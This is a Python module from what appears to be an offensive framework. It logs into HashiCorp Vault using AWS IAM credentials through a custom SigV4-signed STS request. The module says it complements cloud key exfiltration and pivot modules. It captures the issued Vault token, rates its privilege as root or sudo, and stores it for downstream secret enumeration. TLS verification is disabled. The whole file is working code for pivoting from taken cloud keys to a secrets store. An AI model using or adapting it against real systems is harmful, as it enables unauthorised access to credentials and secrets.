"""AWS IAM → Vault authentication bridge.

Given AWS credentials (access key + secret key + optional session token),
sign a ``sts:GetCallerIdentity`` request with SigV4 and POST it to Vault's
``auth/aws/login`` endpoint.  Vault verifies the signature with AWS STS
and returns a client token bound to the matched IAM role's policies.

This module complements ``cloud_key_exfiltration`` and ``cloud_pivot`` —
it turns AWS access into Vault access without ever needing a Vault token.
"""

from __future__ import annotations

import hashlib
import hmac
import json
from datetime import datetime, timezone
from typing import Any, Optional
from urllib.parse import quote, urlencode

from active_execution.registry import BaseExecutionModule, ExecutionResult, RiskLevel
from core.logger import logger


# ---------------------------------------------------------------------------
# Minimal SigV4 signer (stdlib only — no boto3 dependency)
# ---------------------------------------------------------------------------

_SIGN_ALGORITHM = "AWS4-HMAC-SHA256"
_STS_HOST = "sts.amazonaws.com"
_STS_PATH = "/"
_STS_BODY = "Action=GetCallerIdentity&Version=2011-06-15"
_STS_SERVICE = "sts"
_STS_REGION = "us-east-1"  # STS global endpoint


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _hmac_sha256(key: bytes, msg: str | bytes) -> bytes:
    if isinstance(msg, str):
        msg = msg.encode("utf-8")
    return hmac.new(key, msg, hashlib.sha256).digest()


def _signature_key(secret_key: str, date_stamp: str, region: str, service: str) -> bytes:
    k_date = _hmac_sha256(f"AWS4{secret_key}".encode("utf-8"), date_stamp)
    k_region = _hmac_sha256(k_date, region)
    k_service = _hmac_sha256(k_region, service)
    return _hmac_sha256(k_service, "aws4_request")


def _build_canonical_request(
    method: str,
    canonical_uri: str,
    canonical_querystring: str,
    headers: dict[str, str],
    signed_headers: str,
    payload_hash: str,
) -> str:
    header_lines = "\n".join(
        f"{k.lower()}:{v.strip()}" for k, v in sorted(headers.items())
    )
    return "\n".join([
        method,
        canonical_uri,
        canonical_querystring,
        header_lines + "\n",
        signed_headers,
        payload_hash,
    ])


def sign_sts_get_caller_identity(
    access_key: str,
    secret_key: str,
    session_token: Optional[str] = None,
    region: str = _STS_REGION,
) -> dict[str, str]:
    """Return a dict of signed STS GetCallerIdentity request metadata.

    The return value can be passed directly as the ``iam_http_request_headers``
    and ``iam_request_*`` fields to Vault's ``auth/aws/login``.
    """
    now = datetime.now(timezone.utc)
    amz_date = now.strftime("%Y%m%dT%H%M%SZ")
    date_stamp = now.strftime("%Y%m%d")

    # Canonical request components
    method = "POST"
    canonical_uri = _STS_PATH
    body_hash = _sha256(_STS_BODY.encode("utf-8"))

    # Minimal headers that Vault AWS auth requires
    headers: dict[str, str] = {
        "Host": _STS_HOST,
        "X-Amz-Date": amz_date,
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    }
    if session_token:
        headers["X-Amz-Security-Token"] = session_token

    signed_headers = ";".join(sorted(k.lower() for k in headers))

    canonical_request = _build_canonical_request(
        method, canonical_uri, "", headers, signed_headers, body_hash
    )

    credential_scope = f"{date_stamp}/{region}/{_STS_SERVICE}/aws4_request"
    string_to_sign = "\n".join([
        _SIGN_ALGORITHM,
        amz_date,
        credential_scope,
        _sha256(canonical_request.encode("utf-8")),
    ])

    signing_key = _signature_key(secret_key, date_stamp, region, _STS_SERVICE)
    signature = hmac.new(signing_key, string_to_sign.encode("utf-8"), hashlib.sha256).hexdigest()

    authorization = (
        f"{_SIGN_ALGORITHM} "
        f"Credential={access_key}/{credential_scope}, "
        f"SignedHeaders={signed_headers}, "
        f"Signature={signature}"
    )

    # Build Vault-compatible IAM request envelope
    # Vault needs: iam_http_request_method, iam_request_url,
    # iam_request_body, iam_request_headers (as JSON string)
    iam_headers = {
        "Authorization": authorization,
        "Content-Type": headers["Content-Type"],
        "Host": _STS_HOST,
        "X-Amz-Date": amz_date,
    }
    if session_token:
        iam_headers["X-Amz-Security-Token"] = session_token

    return {
        "iam_http_request_method": method,
        "iam_request_url": _STS_HOST,
        "iam_request_body": _STS_BODY,
        "iam_request_headers": json.dumps(iam_headers),
    }


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------


class AwsIamAuthLoginModule(BaseExecutionModule):
    """Log into Vault via the AWS IAM auth method using explicit credentials.

    Does NOT require a Vault token — the returned client token is captured
    and stored in the global credential store for downstream use.

    Parameters (passed via the *params* dict to ``execute``):
        access_key (str):     AWS access key ID.
        secret_key (str):     AWS secret access key.
        session_token (str):  Optional AWS session token (for STS / assumed roles).
        role (str):           Vault role name.  If omitted the first available
                              role on the AWS auth mount is tried.
        mount_path (str):     Auth mount path (default: ``aws``).
        region (str):         AWS region for STS signing (default: ``us-east-1``).
    """

    def __init__(self):
        super().__init__(
            module_id="aws_auth.login",
            title="AWS IAM → Vault Login",
            risk_level=RiskLevel.STATE_CHANGING,
            description=(
                "AWS IAM credential'larını kullanarak Vault'a login ol. "
                "SigV4 ile sts:GetCallerIdentity imzalanır, "
                "POST auth/aws/login ile token alınır."
            ),
            domain="cloud",
            default_enabled=True,
        )

    def can_run(self, context) -> bool:
        # Only requires a Vault address — NO vault token needed.
        return bool(context.vault_addr)

    def execute(self, context, params: dict | None = None) -> ExecutionResult:
        import requests

        params = params or {}
        vault_addr = context.vault_addr.rstrip("/")
        token = getattr(context, "token", None)

        access_key = params.get("access_key", "")
        secret_key = params.get("secret_key", "")
        session_token = params.get("session_token")
        role = params.get("role", "")
        mount_path = params.get("mount_path", "aws")
        region = params.get("region", _STS_REGION)

        if not access_key or not secret_key:
            return ExecutionResult(
                "error",
                "Missing AWS credentials — provide access_key and secret_key.",
                {"missing": ["access_key", "secret_key"]},
            )

        # ── 1. Sign the STS request ────────────────────────────────────
        try:
            signed = sign_sts_get_caller_identity(
                access_key, secret_key, session_token, region
            )
        except Exception as exc:
            logger.error(f"AWS SigV4 signing failed: {exc}")
            return ExecutionResult(
                "error",
                f"AWS SigV4 imzalama başarısız: {exc}",
                {},
            )

        # ── 2. POST to Vault's AWS auth endpoint ───────────────────────
        login_url = f"{vault_addr}/v1/auth/{mount_path}/login"
        body: dict[str, Any] = {
            "iam_http_request_method": signed["iam_http_request_method"],
            "iam_request_url": signed["iam_request_url"],
            "iam_request_body": signed["iam_request_body"],
            "iam_request_headers": signed["iam_request_headers"],
        }
        if role:
            body["role"] = role
        if getattr(context, "namespace", None):
            body["namespace"] = context.namespace

        try:
            resp = requests.post(
                login_url,
                json=body,
                headers={"X-Vault-Token": token} if token else {},
                timeout=30,
                verify=False,  # TLS config handled by global setting
            )
        except requests.RequestException as exc:
            logger.error(f"Vault AWS auth login failed: {exc}")
            return ExecutionResult(
                "error",
                f"Vault'a bağlanılamadı: {exc}",
                {"login_url": login_url},
            )

        if resp.status_code == 403:
            return ExecutionResult(
                "failed",
                f"AWS IAM login başarısız (403). IAM entity Vault'daki role ile "
                f"eşleşmiyor veya auth/{mount_path} mount'u yok.",
                {
                    "http_status": 403,
                    "response": resp.text[:500],
                },
            )
        if resp.status_code == 400:
            return ExecutionResult(
                "failed",
                f"AWS IAM login başarısız (400): {resp.text[:300]}",
                {"http_status": 400, "response": resp.text[:500]},
            )
        if resp.status_code >= 500:
            return ExecutionResult(
                "error",
                f"Vault sunucu hatası ({resp.status_code}): {resp.text[:300]}",
                {"http_status": resp.status_code},
            )

        data = resp.json()
        auth = data.get("auth", {})
        client_token = auth.get("client_token", "")
        if not client_token:
            return ExecutionResult(
                "failed",
                f"Vault token dönmedi: {json.dumps(data, ensure_ascii=False)[:500]}",
                {"response": data},
            )

        # ── 3. Register token in dynamic session ───────────────────────
        try:
            from ai_core.dynamic_session import global_store
            policies = auth.get("policies", [])
            token_policies = auth.get("token_policies", [])
            all_policies = list(set(policies + token_policies))
            power = "unknown"
            if "root" in all_policies:
                power = "root"
            elif any("sudo" in p.lower() or p == "*" for p in all_policies):
                power = "sudo"
            global_store.add_token(client_token, source="aws_iam_login", power_level=power)
        except ImportError:
            pass

        # Persist in context so downstream modules pick it up
        context.captured_token = client_token
        context.token = client_token

        return ExecutionResult(
            "success",
            f"AWS IAM login başarılı — Vault token alındı. "
            f"Policies: {all_policies}. Artık capability audit + KV enum çalıştırabilirsin.",
            {
                "vault_token": client_token,
                "policies": all_policies,
                "accessor": auth.get("accessor", ""),
                "lease_duration": auth.get("lease_duration", 0),
                "renewable": auth.get("renewable", False),
                "role_used": role or "(auto)",
            },
        )
